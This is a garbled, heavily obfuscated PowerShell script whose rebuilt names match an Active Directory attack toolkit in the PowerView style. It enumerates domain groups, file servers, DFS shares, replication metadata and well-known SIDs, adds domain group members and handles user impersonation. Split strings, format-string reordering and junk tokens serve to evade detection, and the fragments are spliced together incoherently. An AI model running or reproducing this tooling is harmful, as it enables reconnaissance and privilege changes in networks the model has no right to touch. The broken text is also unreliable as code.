                        YoV{rOoT_orIJK_lIIJKNKIJK_GUid} = [byte[]]YoV{BLObIJK_IJKdAIJKTA}[YoV{roOT_IJKoR_LiNK_GIJKUiIJKdIJK_sTart}..YoV{roOTIJK_OR_IJKLIJKINK_IJKgUiDIJK_eND}]
                        YoV{GuIJKId} = &(Z3b{3}{2}{0}{1}Z3b-f S5zcS5z,S5ztS5','ValidateNotNullOrEmpty()]
        [scriptblock]YoV{vaIJKlIDAteIJKSIJKCRipT},

        [Parameter(vaLuEfROMpiPelINebyProPerTyNAmE = YoV{trIJKUe}, PArametERSetnAME = Z3bDYnAIJKmICPaRIJKAIJKMIJKETeRZ3b)]
        [ValidateNotNullOrEmpty()]
        [string[]]YoV{VIJKALIJKIDAIJKTesEt},

        [Parameter(ValueFrOmPIpELINeByProPERtYnamE = YoV{trIJKUE}, paRAMETeRSetnAME = Z3bdynAmiIJKcIJKpIJKAraMEIJKTErZ3b)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(YoV{_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw (Z3b{0}{3}{25}{13}{24}{14}{26}{18}{6}{21}{22}{16}{7}{4}{1}{15}{12}{20}{5}{9}{19}{11}{8}{10}{23}{2}{17}Z3b -fS5zDictS5z,S5zutS5z,S5zobjS5z,S5ziS5z,S5z.AS5z,S5ziS5z,S5zaS5z,S5zmentS5z,S5zDictioS5z,S5znedParametS5z,S5znarS5z,S5zrS5z,S5zntimeDS5z,S5zmuS5z,S5z be a SyS5z,S5zomation.RuS5z,S5zeS5z,S5zect','fS5zNew-OS5z,S5zjectS5z,S5zbS5z) (Z3b{0}{1}{2}Z3b -fS5zPSObjS5z,S5zeS5z,S5zctS5z)
                        YoV{oIJKUtPIJKUt} JGO &(Z3b{2}{0}{1}Z3b -f S5zemS5z,S5zberS5z,S5zAdd-MS5z) (Z3b{3}{0}{2}{1}Z3b -fS5zotS5z,S5zpertyS5z,S5zeProS5z,S5zNS5z) (Z3b{0}{1}{2}Z3b-fS5zOS5z,S5zbS5z,S5zjectDNS5z) YoV{obIJKjEIJKCTDn}
                        YoV{OutPIJKUt} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdS5z,S5zd-MemS5z,S5zberS5z) (Z3b{1}{0}{3}{2}Z3b -f S5ztePrS5z,S5zNoS5z,S5ztyS5z,S5zoperS5z) (Z3b{2}{1}{0}Z3b-fS5zteNameS5z,S5ztribuS5z,S5zAtS5z) YoV{tEMPOIJKBJIJKEct}.Z3bPszatTIJKRIJKiBuTEnaMeZ3b
                        YoV{oUTIJKp',' if (YoV{psBoundPAIJKRaMeIJKTEIJKRS}[(Z3b{5}{3}{2}{4}{1}{0}Z3b -fS5zseS5z,S5zhBaS5z,S5zrS5z,S5zomputerSeaS5z,S5zcS5z,S5zCS5z)]) { YoV{fILesIJKerVersIJKEIJKARchERArgIJKUMeNts}[(Z3b{3}{2}{0}{1}Z3b-f S5zarchBasS5z,S5zeS5z,S5zeS5z,S5zSS5z)] = YoV{COMpuTEIJKRsEArCIJKhbIJKAIJKsE} }
                    if (YoV{PsBIJKoUNDPAIJKRIJKAIJKmeIJKTErS}[(Z3b{0}{1}Z3b -fS5zServeS5z,S5zrS5z)]) { YoV{FiLESIJKErVErSIJKEArCIJKHeIJKRaRIJKgIJKUmEIJKNIJKTs}[(Z3b{2}{1}{0}Z3b -f S5zerS5z,S5zervS5z,S5zSS5z)] = YoV{sIJKErIJKVeR} }
                    if (YoV{psBOIJKUNDPIJKAIJKRIJKAmEtIJKERs}[(Z3b{2}{0}{1}Z3b -fS5zScopS5z,S5zeS5z,S5zS','t-NetS5z,S5zOUS5z,S5zGS5z) (Z3b{1}{0}{2}{3}Z3b -fS5z-DoS5z,S5zGetS5z,S5zmaS5z,S5zinOUS5z)
&(Z3b{0}{1}{3}{2}Z3b-f S5zSeS5z,S5zt-S5z,S5zasS5z,S5zAliS5z) (Z3b{0}{1}{2}Z3b-f S5zGS5z,S5zet-NetSS5z,S5ziteS5z) (Z3b{2}{1}{0}Z3b -f S5ziteS5z,S5zmainSS5z,S5zGet-DoS5z)
&(Z3b{0}{1}{2}{3}Z3b -f S5zSS5z,S5zeS5z,S5zt-S5z,S5zAliasS5z) (Z3b{2}{1}{0}Z3b-fS5zbnetS5z,S5zNetSuS5z,S5zGet-S5z) (Z3b{3}{2}{0}{1}{4}Z3b -f S5zomainSuS5z,S5zbneS5z,S5zet-DS5z,S5zGS5z,S5ztS5z)
&(Z3b{1}{0}Z3b -fS5zt-AliasS5z,S5zSeS5z) (Z3b{0}{3}{2}{1}Z3b -fS5zGet-NetS5z,S5zupS5z,S5zoS5z,S5zGrS5z) (Z3b{2}{3}{4}{0}{1}Z3b -fS5zaS5z,S5zinGroupS5z,S5zGS5z,S5zet-DoS5z,S5zmS5z)
&(Z3b{1}{2}{0}Z3b -fS5zsS5z,S5zSeS5z,S5zt-AliaS5z) (Z3b{6}{3}{5}{4}{0}{2}{1}{7}Z3b -f S5zdS5z,S5zurityGroS5z,S5zSecS5z,S5zdS5z,S5zManageS5z,S5z-S5z,S5zFinS5z,S5zupsS5z) (Z3b{1}{0}{3}{2}{5}{4}Z3b-fS5zeS5z,S5zGS5z,S5zDomainManaS5z,S5zt-S5z,S5zpS5z,S5zgedSecurityGrouS5z)
&(Z3b{1}{2}{0}Z3b-fS5zliasS5z,S5zSet-S5z,S5zAS5z) (Z3b{3}{0}{5}{2}{4}{1}Z3b -fS5zGS5z,S5zrS5z,S5zpMemS5z,S5zGet-NetS5z,S5zbeS5z,S5zrouS5z) (Z3b{2}{1}{3}{0}Z3b-f S5zerS5z,S5zinGrS5z,S5zGet-DomaS5z,S5zoupMembS5z)
&(Z3b{1}{0}Z3b-fS5zAliasS5z,S5zSet-S5z) (Z3b{0}{1}{2}{3}Z3b-f S5zGet-NeS5z,S5ztFS5z,S5zileSeS5z,S5zrverS5z) (Z3b{1}{3}{0}{2}Z3b -f S5znFiS5z,S5zGet-S5z,S5zleServerS5z,S5zDomaiS5z)
&(Z3b{1}{2}{0}Z3b-fS5zliasS5z,S5zSetS5z,S5z-AS5z) (Z3b{0}{1}{2}Z3b -f S5zGS5z,S5zetS5z,S5z-DFSshareS5z) (Z3b{0}','5zthS5z+S5ze S5z+S5zResulS5z+S5ztS5z+S5zs S5z+S5zobjectS5z+S5z:S5z+S5z S5z+Z3bYoV_Z3b)
                }
            }
            YoV{suBneTseAIJKRcIJKHer}.(Z3b{0}{2}{1}Z3b -fS5zdisS5z,S5zseS5z,S5zpoS5z).Invoke()
        }
    }
}


function get-IJKDoIJKMAinsid {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{1}{4}{2}{3}Z3b-f S5zPSS5z,S5zSS5z,S5zocesS5z,S5zsS5z,S5zhouldPrS5z}, S5zS5z)]
    [OutputType([String])]
    [C',' S5z+S5zErroS5z+S5zrS5z+S5z S5z+S5zdisS5z+S5zposS5z+S5zing S5z+S5zoS5z+S5zf S5z+S5ztS5z+S5zhe S5z+S5zResultS5z+S5zsS5z+S5z S5z+S5zoS5z+S5zbjecS5z+S5zt: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{OIJKBIJKJeCTsEIJKARcIJKher}.(Z3b{2}{1}{0}Z3b -fS5','t.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crEdEnIJKTiIJKAL} =  YoV{JIJKFI}::Z3beMIJKPTYZ3b
    )

    YoV{cONIJKTIJKE','lOrEmpty()]
        [String]
        YoV{dISPLAyIJKNAIJKme},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{desCIJKRiIJKPTIJKion},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DOmIJKAiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CreDENIJKTiIJKAl} =   (&(Z3b{2}{1}{0}Z3b-f S5zLeS5z,S5zIAbS5z,S5zVarS5z)  JFi ).Z3bvalIJKUeZ3b::Z3bemPIJKTyZ3b
    )

    YoV{CIJKoIJKNIJKTEXtarIJKGUMEnIJKTs} = @{
        (Z3b{1}{0}{2}Z3b -f S5zntS5z,S5zIdeS5z,S5zityS5z) = YoV{SaIJKmAccOUnIJKTIJKName}
    }
    if (YoV{psbIJKOIJKUnDIJKPIJKARAMeTErs}[(Z3b{0}{1}Z3b -fS5zDS5z,S5zomainS5z)]) { YoV{coNtextaIJKRguIJKmEIJKNTs}[(Z3b{0}{1}Z3b-fS5zDomaS5z,S5zinS5z)] = YoV{dIJKOmIJKAIN} }
    if (YoV{PsBoUNDpIJKArameIJKTIJKERs}[(Z3b{2}{0}{1}{3}Z3b-fS5zrS5z,S5zedentiaS5z,S5zCS5z,S5zlS5z)]) { YoV{CoIJKNtexIJKTaRgUIJKmeNIJKTs}[(Z3b{2}{3}{1}{0}Z3b-fS5zlS5z,S5zaS5z,S5zCS5z,S5zredentiS5z)] = YoV{CRIJKeIJKdEnTiAl} }
    YoV{CIJKoNIJKTeXt} = &(Z3b{4}{1}{2}{0}{6}{3}{5}Z3b-f S5zcipS5z,S5z-PrS5z,S5zinS5z,S5zlCoS5z,S5zGetS5z,S5zntextS5z,S5zaS5z) @ContextArguments

    if (YoV{cOnIJKText}) {
        YoV{usIJKEr} = &','IJKAIJKMIJKEtIJKEIJKRs}[(Z3b{0}{1}{2}Z3b-f S5zCredS5z,S5zentiS5z,S5zalS5z)]) { YoV{sEarcIJKhERaIJKRIJKgUMEIJKNTS}[(Z3b{1}{2}{0}Z3b -f S5zalS5z,S5zCredentS5z,S5ziS5z)] = YoV{crEDIJKENtIJKIal} }

        function paRSeIJK-pIJKkT {
            [CmdletBinding()]
            Param(
                [Byte[]]
                YoV{PIJKkT}
            )

            YoV{BIJKIn} = YoV{pIJKkt}
            YoV{bloB_VEIJKRIJKsIJKiOn} =   YoV{AEIJKPIJKsI}::Z3bTIJKoUIJKInt32Z3b(YoV{BIJKIN}[0..3],0)
            YoV{BIJKlOb_ElEMEnIJKT_cIJKOUNT} =   ( &(Z3b{1}{0}Z3b-fS5zRS5z,S5zdIS5z) (Z3bVZ3b+Z3bAriZ3b+Z3bAblE:aZ3b+Z3bepSiZ3b)  ).Z3bVAIJKLUEZ3b::Z3btouIIJKNT32Z3b(YoV{bIJKiN}[4..7],0)
            YoV{oIJKFfSET} = 8
            
            YoV{oBIJKJECt_lIJKisT} = @()
            for(YoV{i}=1; YoV{i} -le YoV{blIJKOIJKBIJK_eLEIJKMeIJKNt_COUIJKNt}; YoV{I}++){
                YoV{BIJKlOIJKB_NamE_IJKSIJKiZE_IJKStArT} = YoV{OFIJKFseT}
                YoV{BLob_IJKNAMeIJK_sIJKizE_EIJKNd} = YoV{OFFIJKsET} + 1
                YoV{bLoIJKB_IJKNAmIJKeIJK_siZE} =   YoV{AEIJKpIJKsi}::Z3btOIJKUINtIJK16Z3b(YoV{BIJKin}[YoV{BLOBIJK_NAIJKME_sIzeIJK_STaRt}..YoV{bLObIJK_NIJKAmE_siZIJKe_End}],0)

                YoV{blOB_nIJKAMEIJK_IJKSIJKTARt} = YoV{BIJKloIJKB_naIJKMEIJK_IJKsIzE_end} + 1','al]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKeIJKDIJKentiaL} =  (  &(Z3b{2}{1}{0}Z3b-f S5zARiAbLeS5z,S5zeT-vS5z,S5zgS5z)  (S5zJS5z+S5zFiS5z) -vAluEONlY  )::Z3beIJKMpTyZ3b,

        [Switch]
        YoV{RIJKAW}
    )

    BEGIN {
        YoV{SearcIJKHIJKeIJKRarguIJKMeNTs} = @{
            (Z3b{1}{2}{0}Z3b-f S5zesS5z,S5zProperS5z,S5ztiS5z)    =   (Z3b{4}{1}{5}{3}{2}{0}Z3b -fS5zdataS5z,S5zs-replvaS5z,S5ztaS5z,S5zuemeS5z,S5zmsdS5z,S5zlS5z),(Z3b{5}{3}{1}{4}{0}{2}Z3b-f S5zednS5z,S5ziS5z,S5zameS5z,S5zistinguS5z,S5zshS5z,S5zdS5z)
            S5zRawS5z           =   YoV{tIJKRuE}
        }
        if (YoV{PsbouNDPIJKAIJKRIJKAMetErs}[(Z3b{1}{0}Z3b -f S5zainS5z,S5zDomS5z)]) { YoV{sEIJKAIJKRcHIJKErIJKArguMENTS}[(Z3b{1}{0}Z3b -f S5zainS5z,S5zDomS5z)] = YoV{dIJKOMIJKAiN} }
        if (YoV{pIJKsbIJKOunIJKDIJKpIJKARAMeTErs}[(Z3b{0}{2}{1}Z3b -f S5zLS5z,S5zPFilterS5z,S5zDAS5z)]) { YoV{sEAIJKRcHeRaRgIJKUMeIJKNtS}[(Z3b{3}{2}{0}{1}Z3b -f S5zFiS5z,S5zlterS5z,S5zPS5z,S5zLDAS5z)] = YoV{ldaIJKpfIJKIIJKlter} }
        if (YoV{PsBoUnDpArAMeIJKTIJKeIJKRs}[(Z3b{2}{1}{0}Z3b-fS5zseS5z,S5zrchBaS5z,S5zSeaS5z)]) { YoV{SIJKearChIJKeIJKRARgIJKUmENTS}[(Z3b{2}{0}{1}Z3b -f S5zrchBaS5z,S5zseS5z,S5zSeaS5z)] = YoV{sEaIJKRCIJKhIJKBaSe} }
        if (YoV{pIJKsIJKBOUNdPIJKAramEtIJKeRS}[(Z3b{1}{0}Z3b -f S5zrverS5z,S5zSeS5z)]) { YoV{SEarcheIJKRIJKARIJKGuMents}[(Z3b{0}{1}Z3b -f S5zServeS5z,S5zrS5z)] = YoV{sEIJKRIJKVer} }
        if (YoV{pSbOunIJKdpAIJKRAIJKMEterS}[(Z3b{0}{3}{2}{1}Z3b-fS5zSS5z,S5zopeS5z,S5zchScS5z,S5zearS5z)]) { YoV{SEArIJKCIJKhEIJKRArIJKgIJKUmeNTS}[(Z3b{2}{0}{3}{1}Z3b-fS5zrS5z,S5zeS5z,S5zSeaS5z,S5zchScopS5z)] = YoV{sIJKeaIJKRCIJKHscOPE} }
        if (YoV{pSIJKBouNdIJKPIJKAIJKRAIJKMetERs}[(Z3b{1}{3}{0}{2}Z3b-fS5ztPageSiS5z,S5zResuS5z,S5zzeS5z,S5zlS5z)]) { YoV{searCIJKHeIJKRIJKARGUIJKmEIJKNTS}[(Z3b{4}{3}{0}{1}{2}Z3b -f S5zltPageS5z,S5zSizS5z,S5zeS5z,S5zesuS5z,S5zRS5z)] = YoV{RIJKESIJKUlTPaGeIJKSIIJKzE} }
        if (YoV{PIJKsIJKBoundParIJKAIJKmEterS}[(Z3b{0}{2}{1}{3}Z3b-fS5zServeS5z,S5zimeLimiS5z,S5zrTS5z,S5ztS5z)]) { YoV{SIJKeArcHERIJKArgIJKUMents}[(Z3b{1}{2}{3}{0}Z3b -f S5zitS5z,S5zServerS5z,S5zTimeLS5z,S5zimS5z)] = YoV{seIJKRvErTIMelIJKimIJKIT} }
        if (YoV{pIJKSIJKBounIJKDPaRIJKAMETIJKErS}[(Z3b{1}{0}Z3b -f S5zoneS5z,S5zTombstS5z)]) { YoV{SeaIJKRcHIJKEIJKRAIJKRguMIJKenTs}[(Z3b{0}{2}{1}Z3b-f S5zTombstS5z,S5zeS5z,S5zonS5z)] = YoV{toMBsIJKToIJKNe} }
        if (YoV{PIJKsbIJKOUnIJKdpaIJKRAIJKMETers}[(Z3b{0}{1}{2}Z3b-f S5zCredeS5z,S5znS5z,S5ztialS5z)]) { YoV{SearCheIJKRAIJKRgUmEIJKNts}[(Z3b{1}{0}{2}Z3b -fS5znS5z,S5zCredeS5z,S5ztialS5z)] = YoV{CIJKRIJKedEntial} }

        if (YoV{psIJKBIJKOUNdParIJKAIJKmEters}[(Z3b{2}{1}{0}Z3b -f S5zesS5z,S5ztiS5z,S5zProperS5z)]) {
            YoV{pIJKRoIJKPIJKErtYIJKFIlTER} = YoV{PSboUNIJKDPAIJKRAmIJKEterS}[(Z3b{2}{0}{1}Z3b -fS5zpertS5z,S5ziesS5z,S5zProS5z)] -Join S5zJGOS5z
        }
        else {
            YoV{pIJKROpeIJKRIJKTyfILTeR} = S5zS5z
        }
    }

    PROCESS {
        if (YoV{PSBOuNdIJKPaRIJKAMIJKeTErs}[(Z3b{1}{2}{0}Z3b -f S5zityS5z,S5zIS5z,S5zdentS5z)]) { YoV{SEaRCIJKHeRIJKArgumEIJKNIJKTS}[(Z3b{1}{2}{0}Z3b -f S5ztyS5z,S5zIdS5z,S5zentiS5z)] = YoV{idIJKeNTIIJKTy} }

        &(Z3b{3}{0}{1}{2}{4}Z3b -fS5zDomS5z,S5zainObjeS5z,S5zcS5z,S5zGet-S5z,S5ztS5z) @SearcherArguments JGO &(Z3b{2}{1}{4}{3}{0}Z3b -f S5zjectS5z,S5zEach-S5z,S5zForS5z,S5zbS5z,S5zOS5z) {
            YoV{OIJKBjEcIJKTDN} = YoV{_}.Z3bpRoIJKPeRTIIJKesZ3b[(Z3b{3}{4}{2}{1}{0}Z3b -f S5zeS5z,S5zamS5z,S5ztinguishednS5z,S5zdS5z,S5zisS5z)][0]
            ForEach(YoV{xmLIJKNodE} in YoV{_}.Z3bpIJKRIJKOpErTIJKieSZ3b[(Z3b{0}{2}{4}{1}{3}{5}Z3b-fS5zmsS5z,S5zalS5z,S5zdsS5z,S5zuemetS5z,S5z-replvS5z,S5zadataS5z)]) {
                YoV{TempIJKobjEIJKCT} = [xml]YoV{xMlIJKNIJKodE} JGO &(Z3b{2}{1}{0}Z3b -f S5zObjectS5z,S5zct-S5z,S5zSeleS5z) -ExpandProperty (Z3b{3}{0}{2}{6}{4}{1}{5}Z3b-f S5z_REPL_VS5z,S5zTA_S5z,S5zAS5z,S5zDSS5z,S5zMES5z,S5zDATAS5z,S5zLUE_S5z) -ErrorAction (Z3b{1}{2}{0}{3}Z3b -fS5zlyContiS5z,S5zSilenS5z,S5ztS5z,S5znueS5z)
                if (YoV{tEmIJKpOBIJKJeCT}) {
                    if (YoV{tIJKempIJK','       YoV{seArIJKcHIJKBIJKASe},

        [Parameter(PArAMETeRSEtnaME = Z3blIJKdapZ3b)]
        [Parameter(pARAMEteRSEtNamE = S5zAPIS5z)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{3}{2}Z3b -f S5zmainCS5z,S5zDoS5z,S5zrS5z,S5zontrolleS5z})]
        [String]
        YoV{sIJKeIJKRvER},

        [Parameter(paRAmEtERsetNaME = Z3bldIJKAPZ3b)]
        [ValidateSet({Z3b{0}{1}Z3b-fS5zBS5z,S5zaseS5z}, {Z3b{1}{0}{2}Z3b -f S5zneS5z,S5zOS5z,S5zLevelS5z}, {Z3b{2}{0}{1}Z3b -fS5zubtS5z,S5zreeS5z,S5zSS5z})]
        [String]
        YoV{sEARCHIJKsIJKCOIJKpE} = (Z3b{2}{0}{1}Z3b -f S5zubtrS5z,S5zeeS5z,S5zSS5z),

        [Parameter(pArAMEtERSetnAme = Z3bLDIJKApZ3b)]
        [ValidateRange(1, 10000)]
        [Int]
        YoV{rIJKEsUIJKlTpaGesIJKiZe} = 200,

        [Parameter(pArAMETersetNAMe = Z3bldIJKApZ3b)]
        [ValidateRange(1, 10000)]
        [Int]
        YoV{SEIJKRIJKVerIJKTiIJKmElimit},

        [Parameter(pAramEteRsETname = Z3blIJKdAPZ3b)]
        [Switch]
        YoV{TIJKomBIJKsTIJKonE},

        [Parameter(pArAMetErSETnAME = Z3blDIJKApZ3b)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKReIJKdEIJKNTiAl} =   YoV{jIJKFi}::Z3bEMPIJKTYZ3b
    )

    
    YoV{SEeNDOmAIJKiIJKNs} = @{}

    
    YoV{dIJKOMaiIJKNs} = &(Z3b{1}{2}{0}',']
        [Alias({Z3b{2}{4}{0}{3}{1}Z3b-fS5zntrolS5z,S5zerS5z,S5zDomainS5z,S5zlS5z,S5zCoS5z})]
        [String]
        YoV{SeIJKRVeR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREIJKDeNIJKTIIJKAL} =   (  &(Z3b{1}{0}{2}Z3b -fS5zEt-vAriaS5z,S5zGS5z,S5zBLeS5z) (S5zjS5z+S5zfiS5z)  -VaLUeOnL)::Z3bEMpIJKTyZ3b
    )

    BEGIN {
        YoV{ADNAIJKMEarIJKGUmIJKEnts} = @{}
        if (YoV{PIJKsbOUnDpaIJKRAIJKMeteRS}[(Z3b{1}{2}{0}Z3b-f S5znS5z,S5zDomS5z,S5zaiS5z)]) { YoV{ADnAmeaRGUIJKmIJKEIJKNtS}[(Z3b{0}{1}Z3b-fS5zDomaS5z,S5zinS5z)] = YoV{dIJKOIJKmain} }
        if (YoV{PIJKsboUNIJKDIJKPaIJKRaMETeIJKRS}[(Z3b{1}{0}Z3b-fS5zrverS5z,S5zSeS5z)]) { YoV{AdNamEArGIJKUIJKMEIJKNtS}[(Z3b{1}{2}{0}Z3b -f S5zerS5z,S5zSerS5z,S5zvS5z)] = YoV{seIJKRvEr} }
        if (YoV{PSBoUNdpAIJKRAMIJKEtIJKers}[(Z3b{2}{0}{1}Z3b -f S5zenS5z,S5ztialS5z,S5zCredS5z)]) { YoV{adNAIJKmearGUmENIJKTs}[(Z3b{0}{2}{1}Z3b -fS5zCredeS5z,S5ztialS5z,S5znS5z)] = YoV{CIJKReIJKDeNtiaL} }
    }

    PROCESS {
        ForEach (YoV{TaRgETIJKsIJKId} in YoV{ObIJKJECIJKTIJKSId}) {
            YoV{tIJKARIJKGetSId} = YoV{TARIJKgetsIJKID}.(Z3b{0}{1}Z3b-fS5ztriS5z,S5zmS5z).Invoke(S5z*S5z)
            try {
                
                Switch (YoV{TarIJKgeIJKTSID}) {
                    (Z3b{0}{1}Z3b -fS5zS-1-S5z,S5z0S5z)         { (Z3b{1}{3}{2}{0}Z3b -f S5zyS5z,S5zNuS5z,S5zitS5z,S5zll AuthorS5z) }
                    (Z3b{1}{0}{2}Z3b-f S5z-0-S5z,S5zS-1S5z,S5z0S5z)       { (Z3b{1}{0}Z3b-fS5zyS5z,S5zNobodS5z) }
                    (Z3b{0}{1}Z3b-fS5zS-1S5z,S5z-1S5z)         { (Z3b{0}{1}{2}{3}Z3b-f S5zWS5z,S5zoS5z,S5zrld AuthoS5z,S5zrityS5z) }
                    (Z3b{0}{1}Z3b-f S5zS-S5z,S5z1-1-0S5z)       { (Z3b{0}{2}{1}Z3b-f S5zEvS5z,S5zeS5z,S5zeryonS5z) }
                    (Z3b{1}{0}Z3b -f S5z-1-2S5z,S5zSS5z)         { (Z3b{2}{1}{0}Z3b -fS5zrityS5z,S5zthoS5z,S5zLocal AuS5z) }
                    (Z3b{1}{0}{2}Z3b-f S5z-1-2S5z,S5zSS5z,S5z-0S5z)       { (Z3b{0}{1}Z3b -fS5zLoS5z,S5zcalS5z) }
                    (Z3b{0}{1}{2}Z3b-fS5zS-S5z,S5z1S5z,S5z-2-1S5z)       { (Z3b{2}{1}{0}Z3b-f S5zon S5z,S5zle LogS5z,S5zConsoS5z) }
                    (Z3b{1}{0}Z3b -f S5z-1-3S5z,S5zSS5z)         { (Z3b{3}{0}{4}{1}{2}Z3b -fS5zeator S5z,S5zthoS5z,S5zrityS5z,S5zCrS5z,S5zAuS5z) }
                    (Z3b{1}{0}Z3b -fS5z3-0S5z,S5zS-1-S5z)       { (Z3b{2}{1}{0}Z3b -fS5znerS5z,S5zwS5z,S5zCreator OS5z) }
                    (Z3b{1}{0}Z3b -fS5z3-1S5z,S5zS-1-S5z)       { (Z3b{2}{3}{0}{1}Z3b -f S5zrouS5z,S5zpS5z,S5zCreatoS5z,S5zr GS5z) }
                    (Z3b{1}{0}Z3b -f S5z-2S5z,S5zS-1-3S5z)       { (Z3b{4}{1}{0}{2}{3}{5}Z3b -fS5zatS5z,S5zreS5z,S5zoS5z,S5zr Owner SeS5z,S5zCS5z,S5zrverS5z) }
                    (Z3b{1}{0}Z3b -fS5z-3S5z,S5zS-1-3S5z)       { (Z3b{0}{2}{4}{1}{3}{5}Z3b-fS5zCreator S5z,S5zpS5z,S5zGroS5z,S5z SS5z,S5zuS5z,S5zerverS5z) }
                    (Z3b{0}{1}Z3b-f S5zS-S5z,S5z1-3-4S5z)       { (Z3b{1}{0}{2}Z3b-fS5zwneS5z,S5zOS5z,S5zr RightsS5z) }
                    (Z3b{1}{0}Z3b-fS5z1-4S5z,S5zS-S5z)         { (Z3b{3}{1}{2}{0}Z3b -f S5zhorityS5z,S5z-unique S5z,S5zAutS5z,S5zNonS5z) }
                    (Z3b{1}{0}Z3b -f S5z5S5z,S5zS-1-S5z)         { (Z3b{2}{0}{3}{1}Z3b-fS5zAuS5z,S5zyS5z,S5zNT S5z,S5zthoritS5z) }
                    (Z3b{0}{2}{1}Z3b-f S5zSS5z,S5z1S5z,S5z-1-5-S5z)       { (Z3b{0}{2}{1}Z3b -fS5zDiS5z,S5zupS5z,S5zalS5z) }
                    (Z3b{1}{0}Z3b -f S5z1-5-2S5z,S5zS-S5z)       { (Z3b{1}{0}Z3b-fS5zetworkS5z,S5zNS5z) }
                    (Z3b{1}{0}{2}Z3b-fS5z1S5z,S5zS-S5z,S5z-5-3S5z)       { (Z3b{0}{1}Z3b -fS5zBaS5z,S5ztchS5z) }
                    (Z3b{0}{1}{2}Z3b -f S5zS-1-S5z,S5z5S5z,S5z-4S5z)       { (Z3b{3}{0}{1}{2}Z3b-fS5zteraS5z,S5zctS5z,S5ziveS5z,S5zInS5z) }
         ','JECTPRoIJKpErIJKTyOUIJKTLIJKier {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{3}{4}{0}Z3b-fS5zsS5z,S5zSS5z,S5zPSS5z,S5zhoulS5z,S5zdProcesS5z}, S5zS5z)]
    [OutputType({Z3b{6','  if ((  ( &(Z3b{0}{1}{2}Z3b-fS5zchiLDS5z,S5zITS5z,S5zeMS5z) VaRIablE:3eK6 ).Z3bvAIJKlueZ3b::Z3bCuIJKRReIJKNtTHReADZ3b.(Z3b{3}{1}{2}{0}Z3b-f S5ztateS5z,S5zetAparS5z,S5ztmentSS5z,S5zGS5z).Invoke() -ne S5zSTAS5z) -and (-not YoV{PsboundIJKpaRAMIJKetIJKErS}[(Z3b{0}{1}Z3b-fS5zQuS5z,S5zietS5z)])) {
        &(Z3b{0}{1}{3}{4}{2}Z3b -f S5zWriS5z,S5zte-S5z,S5zngS5z,S5zWaS5z,S5zrniS5z) (Z3b{23}{15}{1}{20}{14}{9}{11}{8}{6}{18}{4}{19}{16}{7}{17}{2}{21}{13}{0}{12}{22}{3}{5}{10}Z3b-f S5ztion maS5z,S5zUserS5z,S5zntS5z,S5zt woS5z,S5z aS5z,S5zrS5z,S5zl.exe is not currentlS5z,S5zded apartmS5z,S5zshelS5z,S5zwS5z,S5zk.S5z,S5zerS5z,S5zy S5z,S5zonaS5z,S5zoS5z,S5z-S5z,S5zaS5z,S5zeS5z,S5zy inS5z,S5z single-threS5z,S5zImpersonati','IJKeaTEvariIJKABIJKLes},
','Automation.CredentialAttribute()]
        YoV{CrEIJKDIJKeIJKNTIAL} =   ( &(Z3b{0}{1}{2}Z3b -fS5zGeS5z,S5zt-iTeS5z,S5zmS5z)  vARiAbLe:jFI ).Z3bvALIJKUeZ3b::Z3bEMPIJKTYZ3b
    )

    BEGIN {
        YoV{coNtIJKeIJKXtARIJKGuIJKmeNIJKTs} = @{
            (Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zIdS5z,S5zntityS5z) = YoV{iIJKDEIJKNTITY}
        }
        if (YoV{PIJKsIJKBoUNDpAIJKRameIJKTIJKErs}[(Z3b{2}{1}{0}Z3b-f S5zinS5z,S5zmaS5z,S5zDoS5z)]) { YoV{CONIJKTEXTargUIJKmEIJKNTS}[(Z3b{0}{1}Z3b-f S5zDomS5z,S5zainS5z)] = YoV{DIJKOMaIJKIn} }
        if (YoV{psbouIJKNDIJKparIJKAmEIJKTerS}[(Z3b{0}{2}{1}Z3b-fS5zCredeS5z,S5zialS5z,S5zntS5z)]) { YoV{coIJKNTExIJKTarGUIJKMIJKeNTS}[(Z3b{2}{0}{1}Z3b -fS5zdS5z,S5zentialS5z,S5zCreS5z)] = YoV{CIJKREDIJKenIJKTiAl} }

        YoV{gRIJKOUPcIJKonTEIJKxT} = &(Z3b{0}{3}{1}{2}Z3b -fS5zGS5z,S5zt-PrincipalConS5z,S5ztextS5z,S5zeS5z) @ContextArguments

        if (YoV{GIJKRoUpIJKCoNteXT}) {
            try {
                YoV{GRIJKOIJKUP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::(Z3b{3}{4}{2}{1}{0}Z3b -fS5ztityS5z,S5zenS5z,S5zByIdS5z,S5zFinS5z,S5zdS5z).Invoke(YoV{gRoUPIJKcOIJKNTexT}.Z3bcIJKONteIJKxtZ3b, YoV{grOupIJKConTIJKExT}.Z3bIDeIJKNTIJKITYZ3b)
            }
            catch {
                &(Z3b{1}{2}{0}Z3b-f S5zgS5z,S5zWrite-WarS5z,S5zninS5z) (S5z[AS5z+S5zddS5z+S5z-DomainGroupMemS5z+S5zbS5z+S5zerS5z+S5z] S5z+S5zErS5z+S5zrS5z+S5zor S5z+S5zfindiS5z+S5zngS5z+S5z S5z+S5ztheS5z+S5z S5z+S5zgS5z+S5zroupS5z+S5z S5z+S5ziS5z+S5zdentity S5z+Z3bS5zYoVIdentityS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
            }
        }
    }

    PROCESS {
        if (YoV{GrIJKOuP}) {
            ForEach ','
            }
            else {
                Throw Z3b[Remove-RemoteConnection] error unmounting YoVTargetPath : YoV(([ComponentModel.Win32Exception]YoVResult).Message) Z3b
        ','S5z,S5zedFunS5z,S5zedS5z,S5zewS5z)
    }
}


